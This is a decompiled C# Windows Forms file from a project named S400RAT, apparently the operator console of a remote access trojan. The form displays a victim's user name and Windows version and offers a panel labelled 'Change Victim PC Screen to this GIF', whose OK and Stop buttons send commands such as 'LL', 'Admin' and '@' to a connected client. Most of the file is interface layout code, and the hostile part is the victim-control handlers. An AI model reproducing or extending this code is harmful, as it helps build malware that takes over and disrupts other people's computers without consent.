using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using SQLABC_ModernUI;

namespace S400RAT;

[DesignerGenerated]
public class Anx : Form
{
	public IContainer icontainer_0;

	[AccessedThroughProperty("panel5")]
	[CompilerGenerated]
	public Panel panel_0;

	[AccessedThroughProperty("n")]
	[CompilerGenerated]
	public Label label_0;

	[AccessedThroughProperty("w")]
	[CompilerGenerated]
	public Label label_1;

	[AccessedThroughProperty("PictureBox1")]
	[CompilerGenerated]
	public PictureBox pictureBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Label2")]
	public Label label_2;

	[AccessedThroughProperty("Label7")]
	[CompilerGenerated]
	public Label label_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Label1")]
	public Label label_4;

	[CompilerGenerated]
	[AccessedThroughProperty("pictureBox3")]
	public PictureBox pictureBox_1;

	[AccessedThroughProperty("label9")]
	[CompilerGenerated]
	public Label label_5;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2ControlBox1")]
	public Guna2ControlBox guna2ControlBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("CCC")]
	public Panel panel_1;

	[CompilerGenerated]
	[AccessedThroughProperty("OK")]
	public Guna2GradientButton guna2GradientButton_0;

	[AccessedThroughProperty("Guna2AnimateWindow1")]
	[CompilerGenerated]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2BorderlessForm1")]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox2")]
	public PictureBox pictureBox_2;

	[CompilerGenerated]
	[AccessedThroughProperty("Stopss")]
	public Guna2GradientButton guna2GradientButton_1;

	[CompilerGenerated]
	[AccessedThroughProperty("Label4")]
	public Label label_6;

	[CompilerGenerated]
	[AccessedThroughProperty("SqlabC_ControlMini1")]
	public SQLABC_ControlMini sqlabc_ControlMini_0;

	[AccessedThroughProperty("Clos")]
	[CompilerGenerated]
	public Timer IoMgspSpOt;

	public Client C;

	public virtual Panel panel5
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = method_5;
			Panel panel = panel_0;
			if (panel != null)
			{
				panel.Paint -= value2;
			}
			panel_0 = value;
			panel = panel_0;
			if (panel != null)
			{
				panel.Paint += value2;
			}
		}
	}

	internal virtual Label n
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	internal virtual Label w
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	public virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	public virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	public virtual PictureBox pictureBox3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	public virtual Label label9
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_3;
			Guna2ControlBox guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click -= value2;
			}
			guna2ControlBox_0 = value;
			guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click += value2;
			}
		}
	}

	public virtual Panel CCC
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	internal virtual Guna2GradientButton OK
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_2;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_0 = value;
			guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	internal virtual Guna2GradientButton Stopss
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_4;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_1 = value;
			guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	public virtual Label Label4
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	internal virtual SQLABC_ControlMini SqlabC_ControlMini1
	{
		[CompilerGenerated]
		get
		{
			return sqlabc_ControlMini_0;
		}
		[CompilerGenerated]
		set
		{
			sqlabc_ControlMini_0 = value;
		}
	}

	public Anx()
	{
		base.Load += Anx_Load;
		method_0();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Anx));
		panel5 = new Panel();
		n = new Label();
		w = new Label();
		PictureBox1 = new PictureBox();
		Label2 = new Label();
		Label7 = new Label();
		Label1 = new Label();
		pictureBox3 = new PictureBox();
		label9 = new Label();
		Guna2ControlBox1 = new Guna2ControlBox();
		CCC = new Panel();
		Label4 = new Label();
		Stopss = new Guna2GradientButton();
		PictureBox2 = new PictureBox();
		OK = new Guna2GradientButton();
		vmethod_1(new Guna2AnimateWindow(icontainer_0));
		vmethod_3(new Guna2BorderlessForm(icontainer_0));
		SqlabC_ControlMini1 = new SQLABC_ControlMini();
		vmethod_5(new Timer(icontainer_0));
		panel5.SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		CCC.SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		SuspendLayout();
		panel5.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		panel5.BackColor = Color.FromArgb(37, 42, 64);
		panel5.Controls.Add(n);
		panel5.Controls.Add(w);
		panel5.Controls.Add(PictureBox1);
		panel5.Controls.Add(Label2);
		panel5.Controls.Add(Label7);
		panel5.Controls.Add(Label1);
		panel5.Controls.Add(pictureBox3);
		panel5.Controls.Add(label9);
		panel5.Location = new Point(0, 1);
		panel5.Name = "panel5";
		panel5.Size = new Size(304, 124);
		panel5.TabIndex = 125;
		n.AutoSize = true;
		n.Font = new Font("Nirmala UI", 9.75f);
		n.ForeColor = Color.FromArgb(158, 161, 176);
		n.Location = new Point(94, 81);
		n.Name = "n";
		n.Size = new Size(18, 17);
		n.TabIndex = 109;
		n.Text = "--";
		w.AutoSize = true;
		w.Font = new Font("Nirmala UI", 9.75f);
		w.ForeColor = Color.FromArgb(158, 161, 176);
		w.Location = new Point(94, 102);
		w.Name = "w";
		w.Size = new Size(18, 17);
		w.TabIndex = 108;
		w.Text = "--";
		PictureBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox1.Image = (Image)componentResourceManager.GetObject("PictureBox1.Image");
		PictureBox1.Location = new Point(243, 7);
		PictureBox1.Name = "PictureBox1";
		PictureBox1.Size = new Size(53, 38);
		PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox1.TabIndex = 107;
		PictureBox1.TabStop = false;
		Label2.AutoSize = true;
		Label2.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label2.ForeColor = Color.White;
		Label2.Location = new Point(4, 7);
		Label2.Name = "Label2";
		Label2.Size = new Size(58, 25);
		Label2.TabIndex = 106;
		Label2.Text = "Index";
		Label7.AutoSize = true;
		Label7.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label7.ForeColor = Color.FromArgb(158, 161, 176);
		Label7.Location = new Point(19, 100);
		Label7.Name = "Label7";
		Label7.Size = new Size(68, 17);
		Label7.TabIndex = 4;
		Label7.Text = "Windows :";
		Label1.AutoSize = true;
		Label1.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label1.ForeColor = Color.FromArgb(158, 161, 176);
		Label1.Location = new Point(6, 79);
		Label1.Name = "Label1";
		Label1.Size = new Size(81, 17);
		Label1.TabIndex = 3;
		Label1.Text = "User Name :";
		pictureBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		pictureBox3.Image = (Image)componentResourceManager.GetObject("pictureBox3.Image");
		pictureBox3.Location = new Point(243, 59);
		pictureBox3.Name = "pictureBox3";
		pictureBox3.Size = new Size(53, 58);
		pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox3.TabIndex = 2;
		pictureBox3.TabStop = false;
		label9.AutoSize = true;
		label9.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label9.ForeColor = Color.FromArgb(84, 131, 255);
		label9.Location = new Point(4, 44);
		label9.Name = "label9";
		label9.Size = new Size(111, 25);
		label9.TabIndex = 0;
		label9.Text = "Information";
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BackColor = Color.Transparent;
		Guna2ControlBox1.BorderColor = Color.Transparent;
		Guna2ControlBox1.FillColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(404, 1);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(45, 29);
		Guna2ControlBox1.TabIndex = 124;
		CCC.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		CCC.BackColor = Color.FromArgb(37, 42, 64);
		CCC.Controls.Add(Label4);
		CCC.Controls.Add(Stopss);
		CCC.Controls.Add(PictureBox2);
		CCC.Controls.Add(OK);
		CCC.ForeColor = Color.Transparent;
		CCC.Location = new Point(12, 142);
		CCC.Name = "CCC";
		CCC.Size = new Size(427, 358);
		CCC.TabIndex = 123;
		Label4.AutoSize = true;
		Label4.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label4.ForeColor = Color.FromArgb(158, 161, 176);
		Label4.Location = new Point(15, 15);
		Label4.Name = "Label4";
		Label4.Size = new Size(215, 17);
		Label4.TabIndex = 127;
		Label4.Text = "Change Victim PC Screen to this GIF";
		Stopss.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		Stopss.Animated = true;
		Stopss.BackColor = Color.Transparent;
		Stopss.CheckedState.Parent = Stopss;
		Stopss.CustomImages.Parent = Stopss;
		Stopss.Enabled = false;
		Stopss.FillColor = Color.FromArgb(24, 30, 54);
		Stopss.FillColor2 = Color.FromArgb(24, 30, 54);
		Stopss.Font = new Font("Segoe UI", 9f);
		Stopss.ForeColor = Color.White;
		Stopss.HoverState.Parent = Stopss;
		Stopss.IndicateFocus = true;
		Stopss.Location = new Point(12, 317);
		Stopss.Name = "Stopss";
		Stopss.ShadowDecoration.Parent = Stopss;
		Stopss.Size = new Size(395, 35);
		Stopss.TabIndex = 120;
		Stopss.Text = "Stop";
		Stopss.UseTransparentBackground = true;
		PictureBox2.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
		PictureBox2.Location = new Point(12, 58);
		PictureBox2.Name = "PictureBox2";
		PictureBox2.Size = new Size(395, 209);
		PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox2.TabIndex = 119;
		PictureBox2.TabStop = false;
		OK.Anchor = AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		OK.Animated = true;
		OK.BackColor = Color.Transparent;
		OK.CheckedState.Parent = OK;
		OK.CustomImages.Parent = OK;
		OK.FillColor = Color.FromArgb(24, 30, 54);
		OK.FillColor2 = Color.FromArgb(24, 30, 54);
		OK.Font = new Font("Segoe UI", 9f);
		OK.ForeColor = Color.White;
		OK.HoverState.Parent = OK;
		OK.IndicateFocus = true;
		OK.Location = new Point(10, 274);
		OK.Name = "OK";
		OK.ShadowDecoration.Parent = OK;
		OK.Size = new Size(395, 35);
		OK.TabIndex = 117;
		OK.Text = "OK";
		OK.UseTransparentBackground = true;
		vmethod_0().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_BLEND;
		vmethod_0().TargetForm = this;
		vmethod_2().ContainerControl = this;
		SqlabC_ControlMini1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		SqlabC_ControlMini1.BackColor = Color.White;
		SqlabC_ControlMini1.BaseColor = Color.FromArgb(46, 51, 73);
		SqlabC_ControlMini1.Font = new Font("Marlett", 12f);
		SqlabC_ControlMini1.Location = new Point(380, 5);
		SqlabC_ControlMini1.Name = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.Size = new Size(18, 18);
		SqlabC_ControlMini1.TabIndex = 132;
		SqlabC_ControlMini1.Text = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.TextColor = Color.FromArgb(243, 243, 243);
		vmethod_4().Enabled = true;
		vmethod_4().Interval = 10;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(46, 51, 73);
		base.ClientSize = new Size(451, 512);
		base.Controls.Add(SqlabC_ControlMini1);
		base.Controls.Add(panel5);
		base.Controls.Add(Guna2ControlBox1);
		base.Controls.Add(CCC);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "Anx";
		Text = "Andx";
		panel5.ResumeLayout(performLayout: false);
		panel5.PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		CCC.ResumeLayout(performLayout: false);
		CCC.PerformLayout();
		((ISupportInitialize)PictureBox2).EndInit();
		ResumeLayout(performLayout: false);
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_0()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_2()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_4()
	{
		return IoMgspSpOt;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(Timer WithEventsValue)
	{
		EventHandler value = method_7;
		Timer ioMgspSpOt = IoMgspSpOt;
		if (ioMgspSpOt != null)
		{
			ioMgspSpOt.Tick -= value;
		}
		IoMgspSpOt = WithEventsValue;
		ioMgspSpOt = IoMgspSpOt;
		if (ioMgspSpOt != null)
		{
			ioMgspSpOt.Tick += value;
		}
	}

	public Image ResizeImage(Image Img, Size NewSize)
	{
		Bitmap bitmap = new Bitmap(NewSize.Width, NewSize.Height);
		Graphics graphics = Graphics.FromImage(bitmap);
		graphics.DrawImage(Img, 0, 0, NewSize.Width, NewSize.Height);
		return bitmap;
	}

	public string ImageToBase64(Image Img, ImageFormat format)
	{
		using MemoryStream memoryStream = new MemoryStream();
		Img.Save(memoryStream, format);
		return Convert.ToBase64String(memoryStream.ToArray());
	}

	public void method_1(object sender, EventArgs e)
	{
	}

	public void method_2(object sender, EventArgs e)
	{
		OK.Enabled = false;
		Stopss.Enabled = true;
		C.Send("LL" + Class7.string_1 + Class7.string_4);
	}

	public void Anx_Load(object sender, EventArgs e)
	{
		C.Send("Admin" + Class7.string_1);
	}

	public void method_3(object sender, EventArgs e)
	{
		if (C != null)
		{
			C.CN = false;
		}
	}

	public void method_4(object sender, EventArgs e)
	{
		C.Send("@");
		OK.Enabled = true;
		Stopss.Enabled = false;
	}

	public void method_5(object sender, PaintEventArgs e)
	{
	}

	public void method_6(object sender, EventArgs e)
	{
		Hide();
	}

	public void method_7(object sender, EventArgs e)
	{
		if (!C.CN)
		{
			C.CN = false;
			Close();
		}
	}
}
